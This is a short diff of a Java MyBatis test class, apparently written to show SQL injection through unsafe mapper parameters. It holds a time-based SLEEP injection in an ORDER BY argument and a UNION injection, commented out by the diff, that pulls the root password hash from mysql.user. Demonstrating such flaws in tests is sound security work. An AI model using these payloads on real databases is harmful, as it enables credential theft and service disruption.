@@ -35,7 +35,7 @@ public class MyMybatisTest {
         val allOrder = articleTypeMapper.findAllOrder("id", "desc , (SELECT(1) FROM (SELECT(SLEEP(10))) test)");
         System.out.println(allOrder);
         // 获取 mysql 密码
-        val selectRoot = articleTypeMapper.findAllByTable("article_type union  SELECT 10086 AS id, NULL, authentication_string AS typename FROM mysql.user WHERE USER LIKE \"%root%\"");
-        System.out.println(selectRoot);
+//        val selectRoot = articleTypeMapper.findAllByTable("article_type union  SELECT 10086 AS id, NULL, authentication_string AS typename FROM mysql.user WHERE USER LIKE \"%root%\"");
+//        System.out.println(selectRoot);
     }
 }
